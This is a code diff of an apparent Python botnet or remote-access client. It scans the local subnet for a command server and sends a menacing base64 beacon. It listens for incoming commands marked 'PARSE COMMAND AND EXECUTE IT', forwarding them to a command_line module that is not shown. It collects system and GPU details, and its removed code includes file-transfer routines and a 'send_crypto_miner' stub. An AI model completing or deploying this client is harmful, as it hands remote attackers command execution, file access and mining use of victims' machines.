@@ -2,20 +2,59 @@ import tqdm
 import os
 import platform
 import GPUtil
+import multiprocessing as mp
 import socket
 import psutil
+import tools
+import command_line as cmd
+
+def locate_server(server_port):
+    
+    for i in range(2,100):
+        server_ip = f"192.168.1.{i}" 
+        try:
+            connection_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            connection_socket.settimeout(10)
+    
+            print(f"[+] Trying connection with {server_ip}")
+            connection_socket.connect((server_ip,server_port))
+            connection_socket.send(b'VEhJUyBXT1JMRCBTSEFMTCBLTk9XIFBBSU4u')
+            connection_socket.close()
+
+            print(f"[+] Server located at {server_ip}")
+
+            break
+    
+        except OSError as exception:
+            print(f"[ERROR] {exception}")
+            print(f"[-] Connection refused with {server_ip}")
+            connection_socket.close()
+
+    connection_socket.close()
+    return server_ip
 
 def receive_data(connection,address,buffer_size):
-    while True: 
-        data = connection.recv(buffer_size).decode()
-        if data:
-            print(f"[{address}] {data}")        
+    #PARSE COMMAND AND EXECUTE IT
+    print(f"[{address}] Listening for incoming data")
+
+    while True:
+        try:
+            data = connection.recv(buffer_size).decode()
+            print(f"[{address}] {data}")
+            cmd.command_line(connection, address, buffer_size, data)
+            #except ConnectionResetError,ConnectionAbortedError:
+        except ConnectionError:
+            print(f"[-] Connection with {address} lost")
+            connection.close()
+
+            return
     
 
 def send_data(connection,address,data):
     try:
-        connection.sendall(data.encode())
-    except Exception as exception:
+        connection.send(data.encode())
+    except ConnectionError as exception:
+        print(f"[!] {exception}")
         print(f"[-] Connection with {address} lost")
 
 
@@ -42,64 +81,14 @@ def get_system_info():
     network_interface = psutil.net_if_stats()
     gpus = GPUtil.getAvailable()
 
-    return f"{system=} {release=} {cpu=} {network_interface=} {gpus=}"
+    return {
+        "system" : system,
+        "release" : release,
+        "gpus" : gpus,
+        "cpu" : cpu,
+        "network_interface" : network_interface
+        }
 
-
-def command_line(): 
-    pass
-
-def send_file(filename,buffer_size,connection,separator="<SEPARATOR>"):
-    print(f"Sending '{filename}'") 
-    file_size = os.path.getsize(filename)
-    #SEND FILE DATA
-    connection.send(f"{filename}{separator}{file_size}".encode())
-
-    progress = tqdm.tqdm(
-        range(file_size),
-        f"Sending {filename}", 
-        unit="B", 
-        unit_scale=True, 
-        unit_divisor=1024)
-    
-    with open(filename, "rb") as file:
-        while True:
-            bytes_read = file.read(buffer_size)
-            if not bytes_read:
-                break
-            connection.sendall(bytes_read)
-            progress.update(len(bytes_read))
-
-def send_crypto_miner(): 
-    return    
-
-
-def receive_file(buffer_size,client,separator="<SEPARATOR>",):
-    print("Receiving data..")
-    encoding = 'utf-8' 
-    file_data = client.recv(buffer_size).decode(encoding)
-    #ADD TRY CATCH 
-    filename,file_size = file_data.split(separator)
-    #print(file_data)
-    # remove absolute path if there is
-    filename = os.path.basename(filename)
-    file_size = int(file_size)
-
-    progress = tqdm.tqdm(
-        range(file_size),
-        f"Receiving {filename}", 
-        unit="B", 
-        unit_scale=True, 
-        unit_divisor=1024)
-    
-    #WRITE BYTES IN FILE
-    with open(filename,'wb') as file: 
-        while True: 
-            bytes_read = client.recv(buffer_size)
-            if not bytes_read:
-                break
-            
-            file.write(bytes_read)
-            progress.update(len(bytes_read))
 
 if __name__ == "__main__":
-    get_system_info()
+    locate_server(8080)
